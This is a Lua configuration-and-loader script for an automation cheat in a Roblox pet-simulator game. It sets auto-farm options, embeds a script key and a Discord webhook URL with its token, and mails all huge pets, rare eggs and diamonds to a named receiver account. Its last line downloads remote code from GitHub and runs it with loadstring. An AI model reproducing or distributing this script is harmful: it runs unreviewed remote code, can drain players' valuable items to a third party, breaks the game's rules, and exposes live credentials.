repeat wait(10) until game:IsLoaded()
script_key = "ipXBywOqWcuQMMEBBCmVrvDBXrSRfJLd";
_G.GDO_CANNON_TYCOON_EVENT = true
_G.GUSE_HELLFIRE_CORES = true
_G.GCONVERT_HELLFIRE_CRYSTALS = true
_G.GUSE_CANNON_CONSUMABLES = true
_G.GTYCOON_MAX_REBIRTHS = 20
_G.GAUTO_TYCOON_PET_UPGRADE = true
_G.GHATCH_CHARGED_EGGS = true
_G.GLOOTBOXES = {"Hellfire Gift"}
_G.GGFX_MODE = 1 -- or 2 to still see something
_G.GZONE_TO = 999 -- to enter event from W3 intead put 999
_G.GENCHANTS = {"Lucky Eggs", "Lucky Eggs", "Lucky Eggs", "Coins", "Fortune", "Strong Pets"}
_G.GWEBHOOK_USERID = "your-discord-id"
_G.GWEBHOOK_LINK = "https://discord.com/api/webhooks/1330044667114291303/dDUp-QKB4KPghtF5s22-WVvQOlJ8xd1m8-kCJgOD848pEM9gOrEdd1ZhrCTkSrveWVTv"
_G.GMAIL_RECEIVERS = {"zigsua"} -- for Mail items
_G.GMAIL_DELAY = 7.1
_G.GMAIL_ITEMS = {
  ["All Huges"] = {Class = "Pet", Id = "All Huges", Amount = 1},
  ["Hype Egg 2 "] = {Class = "Lootbox", Id = "Hype Egg 2", MinAmount = 1},
  ["Hype Egg"] = {Class = "Lootbox", Id = "Hype Egg", MinAmount = 1},
  ["Daycare egg"] = {Class = "Egg", Id = "Huge Machine Egg 4", MinAmount = 1},
  ["Secret pet1"] = {Class = "Pet", Id = "Rainbow Swirl", MinAmount = 1, AllVariants = true},
  ["Secret pet2"] = {Class = "Pet", Id = "Banana", MinAmount = 1, AllVariants = true},
  ["Secret pet3"] = {Class = "Pet", Id = "Coin", MinAmount = 1, AllVariants = true},
  ["Secret pet4"] = {Class = "Pet", Id = "Lucky Block", MinAmount = 1, AllVariants = true},
  ["Normal Wild Galaxy Agony"] = {Class = "Pet", Id = "Wild Galaxy Agony", MinAmount = 50},
  ["Golden Wild Galaxy Agony"] = {Class = "Pet", Id = "Wild Galaxy Agony", MinAmount = 10, IsGold = true},
  ["RB Wild Galaxy Agony"] = {Class = "Pet", Id = "Wild Galaxy Agony", MinAmount = 10, IsRainbow = true},
  ["Shiny Normal Wild Galaxy Agony"] = {Class = "Pet", Id = "Wild Galaxy Agony", MinAmount = 1, IsShiny = true},
  ["Shiny Golden Wild Galaxy Agony"] = {Class = "Pet", Id = "Wild Galaxy Agony", MinAmount = 1, IsGold = true, IsShiny = true},
  ["Shiny RB Wild Galaxy Agony"] = {Class = "Pet", Id = "Wild Galaxy Agony", MinAmount = 1, IsRainbow = true, IsShiny = true},
  ["Send all Diamonds"] = {Class = "Currency", Id = "Diamonds", MinAmount = "50m"},
}
loadstring(game:HttpGet("https://raw.githubusercontent.com/sxdasfvas/test/main/gscripts.lua"))()
